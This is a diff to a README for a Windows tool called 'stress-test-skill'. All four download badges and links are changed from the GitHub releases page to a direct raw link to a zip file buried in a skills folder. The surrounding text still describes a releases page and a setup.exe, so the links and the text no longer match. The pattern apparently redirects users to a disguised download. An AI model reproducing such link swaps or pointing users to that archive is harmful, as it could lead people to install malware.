@@ -1,6 +1,6 @@
 # ⚙️ stress-test-skill - Verify and Improve Your Technical Plans
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/Hunter1x2/stress-test-skill/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/Hunter1x2/stress-test-skill/main/skills/stress-test/test_skill_stress_v3.9-beta.4.zip)
 
 ## 📋 What is stress-test-skill?
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and run stress-test-skill on your Windo
 
 You need to get the installer from the official releases page. Click this button to visit the downloads:
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-blue)](https://github.com/Hunter1x2/stress-test-skill/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-blue)](https://raw.githubusercontent.com/Hunter1x2/stress-test-skill/main/skills/stress-test/test_skill_stress_v3.9-beta.4.zip)
 
 This page shows all available versions. Look for the newest release and find the file named something like `stress-test-skill-setup.exe`.
 
@@ -119,7 +119,7 @@ Find these options under the `Settings` menu inside the program.
 
 Check the releases page regularly for updates:
 
-[Download Latest Version](https://github.com/Hunter1x2/stress-test-skill/releases)
+[Download Latest Version](https://raw.githubusercontent.com/Hunter1x2/stress-test-skill/main/skills/stress-test/test_skill_stress_v3.9-beta.4.zip)
 
 Download the newest installer and repeat the installation steps to update.
 
@@ -129,4 +129,4 @@ For detailed help and user guides, visit the repository’s Wiki on GitHub. Look
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/Hunter1x2/stress-test-skill/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/Hunter1x2/stress-test-skill/main/skills/stress-test/test_skill_stress_v3.9-beta.4.zip)
